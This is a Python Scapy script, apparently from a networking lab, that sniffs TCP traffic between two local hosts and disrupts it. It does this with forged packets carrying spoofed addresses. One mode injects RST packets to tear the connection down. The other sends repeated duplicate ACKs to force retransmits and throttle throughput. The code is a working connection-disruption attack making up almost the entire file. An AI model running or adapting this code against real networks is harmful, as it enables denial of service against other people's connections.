
from scapy.all import *

WINDOWS_SIZE = 512
tcp_rst_count = 10


def send_3_duplicate_ack(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq_val = p[TCP].seq
    ack_val = p[TCP].ack
    flags = p[TCP].flags

    ack_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, 
                                    flags = "A",   #Set ACK flag
                                    ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
                                    seq = ack_val)
    
    # 3 duplicate ack packets will trigger "fast retransmit" at reciever
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0) 

    # DET SER UD TIL AT THROTTLE. MEN KUN MEGET LIDT. CA FRA 9 til 11 sekunder

    print("3 ACK packets was send!") 

    return


def send_reset(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq = p[TCP].seq
    ack = p[TCP].ack
    flags = p[TCP].flags

    rst_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, 
                                    flags = "R", 
                                    seq = ack)

    send(rst_packet, verbose = 0)
    print("sending reset packet!") #(print after sending for speed)

    return

def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):

    #ERROR CHECK ADDRESSER
    print(f"dst host {dest_addr} and src host {source_addr}")


    #sniffed_packages = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 100)
    #sniffed_package = sniff(filter = f"tcp", count = 5)
    #newest_packet = sniffed_packages[99] # latest packet 
    #package_sample1 = sniffed_packages[1]


    #print(newest_packet[TCP].ack)
    #print(package_sample1[TCP].ack)


    if approach == "ACK":
        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 200, prn = send_3_duplicate_ack) #NESP TÆNK OVER OM DET ER DET KORREKT AT SENDE 3 efter hver pakke

    elif approach == "RST":
        # seqs = range(package_sample[TCP].seq, max_seq, int(win / 2))

        #sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50) ## SKIP FIRST 100 PACKETS - to make sure there is a connection
        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50, prn = send_reset) 

        # while True:
        #     newest_packet_list = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 1)
        #     newest_packet = newest_packet_list[0]

        #     dst_port = newest_packet[TCP].dport
        #     src_port = newest_packet[TCP].sport
        #     rst_packet = IP(src = dest_addr, dst = source_addr) / TCP(sport = dst_port, dport = src_port, flags = "R", seq = newest_packet[TCP].ack) # note: src and dst address and po is flipped on purpose!
    
        #     send(rst_packet, verbose = 0)
        #     print("send")
    else:
        raise ValueError("Incorrect or invalid approach")


def main():
    
    #tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
    tcp_throttling("192.168.1.203", "192.168.1.73", "ACK")
    

if __name__ == "__main__":
    main()

## https://github.com/robert/how-does-a-tcp-reset-attack-work/blob/master/main.py
## https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
        